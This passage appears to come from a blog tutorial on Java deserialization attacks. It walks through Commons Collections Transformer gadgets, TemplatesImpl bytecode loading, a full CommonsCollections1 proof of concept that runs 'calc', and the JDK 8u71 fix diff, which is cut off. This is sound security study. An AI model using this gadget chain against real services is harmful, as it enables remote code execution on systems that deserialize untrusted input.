<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>Transformer</code> 构造的代码执行流中，我们可以把 <code>ConstantTransformer</code> 理解为一个常量，可以返回一个确定的对象。</p>
<p>这样我们就可以屏蔽前面定义的 <code>readObject</code> 方法触发 <code>transform</code> 方法调用时传入的 <code>input</code> 参数对我们构造的 <code>Transformer</code> 构造的代码执行流产生影响。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><code>InvokerTransformer</code> 可以对 <code>transform</code> 方法传入的对象参数用来执行任意方法，这也是反序列化能执行任意代码的关键。</p>
<p>在实例化这个 <code>InvokerTransformer</code> 时，需要传入三个参数：</p>
<ul>
<li><code>String methodName</code>：待执行的函数名</li>
<li><code>Class[] paramTypes</code>：这个函数的参数类型列表</li>
<li><code>Object[] args</code>：传给这个函数的参数列表<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
后面的回调 <code>transform</code> 方法，就是执行了 <code>input</code> 对象的 <code>iMethodName</code> 方法，并传入 <code>iArgs</code> 参数，即 <code>input.iMethod(iArgs)</code>。<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="type">InvocationTargetException</span> <span class="variable">ex</span> <span class="operator">=</span> var6;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p><code>InstantiateTransformer</code> 会把传入的 <code>input</code> 看做是一个 <code>Class</code> 对象，然后调用其对应的构造函数并传入指定参数来实例化一个对象。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>ChainedTransformer</code> 也是实现了 <code>Transformer</code> 接口的一个类，它的作用是将内部的多个 <code>Transformer</code> 串在一起。通俗来说就是，前一个回调返回的结果，作为后一个回调的参数传入。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="Transformer-构造代码执行流"><a href="#Transformer-构造代码执行流" class="headerlink" title="Transformer 构造代码执行流"></a>Transformer 构造代码执行流</h3><h4 id="构造任意代码执行"><a href="#构造任意代码执行" class="headerlink" title="构造任意代码执行"></a>构造任意代码执行</h4><p>根据前面对 <code>Transformer</code> 的介绍，我们可以将 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> 拆解为 <code>runtime = Runtime.getRuntime()</code> 和 <code>runtime.exec(&quot;calc&quot;)</code> 两部分，因而有如下构造：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
<p>然而由于 <code>Runtime</code> 对象没有实现 <code>Serializable</code> 接口，因此 <code>transformerChain</code> 对象是无法序列化的，因此我们还要把 <code>Runtime.getRuntime()</code> 拆解为 <code>getRuntime = Runtime.class.getMethod(&quot;getRuntime&quot;)</code> 和 <code>getRuntime.invoke(null)</code>。</p>
<p>由于 <code>InvokerTransformer</code> 内部会对传入的方法调用 <code>getMethod</code> 查找，因此构造 <code>InvokerTransformer</code> 时传入的参数类型需要严格按照传入的方法名对应的方法的定义来，且参数要和参数类型数量严格对应，这就是为什么实际上我们构造的是 <code>Runtime.class.getMethod(&quot;getRuntime&quot;, null)</code> 和 <code>getRuntime.invoke(null, null)</code> 。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
<h4 id="构造任意字节码加载"><a href="#构造任意字节码加载" class="headerlink" title="构造任意字节码加载"></a>构造任意字节码加载</h4><p><code>TemplatesImpl</code> 加载任意字节码有如下调用栈：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">main:34, DefineClassExample (com.example)</span><br></pre></td></tr></table></figure></div>
<p>因此我们只需要想办法让程序执行流程能够到达这个调用栈中任意一个函数即可，例如 <code>newTransformer</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> createTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
<h2 id="相关利用链"><a href="#相关利用链" class="headerlink" title="相关利用链"></a>相关利用链</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/java-serialization/images/5a4d01c1d0904b5c8444ceaa2cf42198.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="CommonsCollections0（AnnotationInvocationHandler→TransformedMap）"><a href="#CommonsCollections0（AnnotationInvocationHandler→TransformedMap）" class="headerlink" title="CommonsCollections0（AnnotationInvocationHandler→TransformedMap）"></a>CommonsCollections0（AnnotationInvocationHandler→TransformedMap）</h3><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的 <code>readObject</code> 中的 <code> memberValue.setValue</code> 会调用 <code>setValue</code> 方法，进而会调用到 <code>memberValues</code> 的 <code>transformer</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>不过这里需要绕过 <code>memberType != null</code> 判断，根据调试可知 <code>memberTypes</code> 中的 <code>key</code> 是构造时传入的 <code>type</code> 对应的类中的所有方法名字符串，而 <code>name</code> 是构造时传入的 <code>memberValues</code> 中的某个 <code>key</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>又因为 <code>type</code> 还要继承自 <code>Annotation</code>，因此因此我构造的时候 <code>type</code> 选择 <code>Retention.class</code> ，这样 <code>memberTypes</code> 中的键就有一个 <code>value</code> 字符串，此时我们预先在 <code>memberValues</code> 中存一个 <code>value</code> 字符串的键就可以执行到 <code>setValue</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the retention policy.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the retention policy</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>完整 poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">checkSetValue:204, TransformedMap (org.apache.commons.collections.map)</span><br><span class="line">setValue:192, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)</span><br><span class="line">readObject:356, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:36, CommonsCollections1 (com.example)</span><br></pre></td></tr></table></figure></div>
<p>在 8u71 以后大概是 2015 年 12 月的时候，Java 官方<a class="link"   href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d" >修改 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的 <code>readObject</code> 函数。新版的 <code>readObject</code> 不再操作 <code>memberValues</code> 而是操作 <code>Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null)</code> ，因此 CC1 失效。</p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 08:58:28 2015 -0500</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 22:38:16 2015 +0000</span></span><br><span class="line"><span class="meta">@@ -25,6 +25,7 @@</span></span><br><span class="line"> </span><br><span class="line"> package sun.reflect.annotation;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+import java.io.ObjectInputStream;</span></span><br><span class="line"> import java.lang.annotation.*;</span><br><span class="line"> import java.lang.reflect.*;</span><br><span class="line"> import java.io.Serializable;</span><br><span class="line"><span class="meta">@@ -425,35 +426,72 @@</span></span><br><span class="line"> </span><br><span class="line">     private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">         throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="deletion">-        s.defaultReadObject();</span></span><br><span class="line"><span class="addition">+        ObjectInputStream.GetField fields = s.readFields();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(&quot;type&quot;, null);</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);</span></span><br><span class="line"> </span><br><span class="line">         // Check to make sure that types have not evolved incompatibly</span><br><span class="line"> </span><br><span class="line">         AnnotationType annotationType = null;</span><br><span class="line">         try &#123;</span><br><span class="line"><span class="deletion">-            annotationType = AnnotationType.getInstance(type);</span></span><br><span class="line"><span class="addition">+            annotationType = AnnotationType.getInstance(t);</span></span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">             // Class is no longer an annotation type; time to punch out</span><br><span class="line">             throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="addition">+        // consistent with runtime Map type</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();</span></span><br><span class="line"> </span><br><span class="line">         // If there are annotation members without values, that</span><br><span class="line">         // situation is handled by the invoke method.</span><br><span class="line"><span class="deletion">-        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span></span><br><span class="line"><span class="addition">+        for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span></span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line"><span class="addition">+            Object value = null;</span></span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">             if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line"><span class="deletion">-                Object value = memberValue.getValue();</span></span><br><span class="line"><span class="addition">+                value = memberValue.getValue();</span></span><br><span class="line">                 if (!(memberType.isInstance(value) ||</span><br><span class="line">                       value instanceof ExceptionProxy)) &#123;</span><br><span class="line"><span class="deletion">-                    memberValue.setValue(</span></span><br><span class="line"><span class="deletion">-                        new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line"><span class="addition">+                    value = new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line">                             value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line"><span class="deletion">-                                annotationType.members().get(name)));</span></span><br><span class="line"><span class="addition">+                                annotationType.members().get(name));</span></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"><span class="addition">+            mv.put(name, value);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setType(this, t);</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setMemberValues(this, mv);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span 